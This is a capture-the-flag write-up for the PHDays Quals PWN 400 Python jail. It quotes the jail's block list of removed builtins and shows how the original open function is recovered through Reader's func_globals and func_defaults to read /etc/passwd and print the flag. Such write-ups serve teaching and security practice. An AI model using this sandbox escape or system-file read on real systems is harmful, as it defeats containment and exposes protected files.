# PHDays Quals PWN 400

PWN 400 is a python jail. We are given a python REPL, but most useful
functions and builtins are deleted from the global namespace. We are
offered one function, **Reader(filename)**, but it can only read three
files:

* log.1
* log.2
* log.3

The files contain dumps of trollfaces :(.

We're also given the source code, which has two files.

**pyjail.py** is the REPL. This is the most important code:

    inp = raw_input('>>> ')
    a = None
    exec 'a=' + inp

**secure_reader.py** is the script that makes the REPL annoying to use.

    UNSAFE_BUILTINS = [
        'open', 'file', 'execfile', 'reload', 'input', 'eval', 'type', 'compile'
        ]

    UNSAFE_ATTRS = [
        '__globals__', '__closure__'
        ]

    ALLOWED_FILES = [
        'log.1', 'log.2', 'log.3'
        ]

...

    def remove_builtins():
        for item in UNSAFE_BUILTINS:
            del __builtin__.__dict__[item]
        def null(*args, **kwargs):
            pass
        __builtin__.__import__ = null

...

    del dictionary_of(type)['__subclasses__']
    del dictionary_of(GeneratorType)['gi_frame']
    del dictionary_of(FrameType)['f_code']
    del dictionary_of(FrameType)['f_builtins']
    del dictionary_of(FrameType)['f_globals']
    del dictionary_of(GeneratorType)['gi_code']

And so on

So it removes most of the usable functions. Here is how it defines the
Reader function:

    def _Reader(
        open_file=open,
        type=type,
        TypeError=TypeError,
        Namespace=Namespace,
        ):

        @guard(filename=str)
        def Reader(filename):
           if filename not in ALLOWED_FILES:
               raise ValueError("You can't read that shit!")
           data = open_file(filename).read()
           return data

        return Reader

    Reader = _Reader()

The outside function **_Reader** returns the inside function **Reader**,
which is what we have access to. It is important to realize that **if Reader
can read files at all, then it must have access to some file reading
mechanism**. It calls 'open_file', which is really just an alias to
'open'. We get the open function through the Object Tree starting with
the Reader function.

    Reader.func_globals['_Reader'].func_defaults[0]

We can also read the **/etc/passwd** file directly now

    Reader.func_globals['_Reader'].func_defaults[0]('/etc/passwd').read()

Which contains the flag in plaintext.

    41f20268caa093e1b746e5ca750d3aa0

